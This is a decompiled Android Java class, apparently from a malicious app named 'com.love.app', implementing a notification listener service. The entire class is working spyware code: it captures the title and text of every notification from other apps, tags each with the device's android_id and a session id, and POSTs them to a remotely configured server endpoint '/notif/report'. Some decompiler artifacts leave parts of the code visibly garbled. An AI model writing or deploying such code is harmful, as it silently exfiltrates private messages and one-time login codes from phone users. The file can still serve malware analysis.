/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.content.ContentResolver
 *  android.content.Context
 *  android.provider.Settings$Secure
 *  android.service.notification.NotificationListenerService
 *  android.service.notification.StatusBarNotification
 *  android.util.Log
 *  org.json.JSONObject
 */
package com.love.app;

import android.content.ContentResolver;
import android.content.Context;
import android.provider.Settings;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.Volley;
import com.love.app.ConfigFetcher;
import com.love.app.NotificationListener$$ExternalSyntheticLambda0;
import com.love.app.NotificationListener$$ExternalSyntheticLambda1;
import org.json.JSONObject;

public class NotificationListener
extends NotificationListenerService {
    private static final String TAG = "NotificationListener";
    private RequestQueue requestQueue;

    static /* synthetic */ void lambda$sendToServer$0(String string2, JSONObject jSONObject) {
        Log.d((String)TAG, (String)("Notif terkirim: " + string2));
    }

    static /* synthetic */ void lambda$sendToServer$1(VolleyError object) {
        StringBuilder stringBuilder = new StringBuilder("Gagal kirim notif: ");
        object = ((Throwable)object).getMessage() != null ? ((Throwable)object).getMessage() : "unknown";
        Log.w((String)TAG, (String)stringBuilder.append((String)object).toString());
    }

    private void sendToServer(String charSequence, String object, String object2, String object3) {
        String string2 = ConfigFetcher.getBaseUrl((Context)this);
        if (string2 != null && !string2.isEmpty()) {
            try {
                JSONObject jSONObject = new JSONObject();
                jSONObject.put("device_id", (Object)charSequence);
                jSONObject.put("app", object);
                jSONObject.put("title", object2);
                jSONObject.put("content", object3);
                jSONObject.put("time", System.currentTimeMillis());
                jSONObject.put("session_id", (Object)ConfigFetcher.getSessionId((Context)this));
                charSequence = new StringBuilder();
                charSequence = ((StringBuilder)charSequence).append(string2).append("/notif/report").toString();
                object3 = new NotificationListener$$ExternalSyntheticLambda0((String)object);
                object = new NotificationListener$$ExternalSyntheticLambda1();
                object2 = new JsonObjectRequest(1, (String)charSequence, jSONObject, (Response.Listener<JSONObject>)object3, (Response.ErrorListener)object);
                this.requestQueue.add(object2);
            }
            catch (Exception exception) {
                Log.e((String)TAG, (String)"sendToServer error", (Throwable)exception);
            }
            return;
        }
        Log.w((String)TAG, (String)"baseUrl belum tersedia, notif dilewati");
    }

    public void onCreate() {
        super.onCreate();
        this.requestQueue = Volley.newRequestQueue((Context)this);
    }

    /*
     * WARNING - void declaration
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    public void onNotificationPosted(StatusBarNotification object) {
        String string2 = "";
        try {
            void var2_7;
            String string3;
            String string4;
            block9: {
                block8: {
                    string4 = object.getPackageName();
                    if (string4.equals(this.getPackageName())) {
                        return;
                    }
                    string3 = object.getNotification().extras.getString("android.title", "");
                    CharSequence charSequence = object.getNotification().extras.getCharSequence("android.text");
                    object = string2;
                    if (charSequence != null) {
                        object = ((Object)charSequence).toString();
                    }
                    if (string3.isEmpty() && ((String)object).isEmpty()) {
                        return;
                    }
                    charSequence = Settings.Secure.getString((ContentResolver)this.getContentResolver(), (String)"android_id");
                    if (charSequence == null) break block8;
                    CharSequence charSequence2 = charSequence;
                    if (!((String)charSequence).isEmpty()) break block9;
                }
                String string5 = "unknown";
            }
            this.sendToServer((String)var2_7, string4, string3, (String)object);
            return;
        }
        catch (Exception exception) {
            Log.e((String)TAG, (String)"onNotificationPosted error", (Throwable)exception);
        }
    }

    public void onNotificationRemoved(StatusBarNotification statusBarNotification) {
    }
}

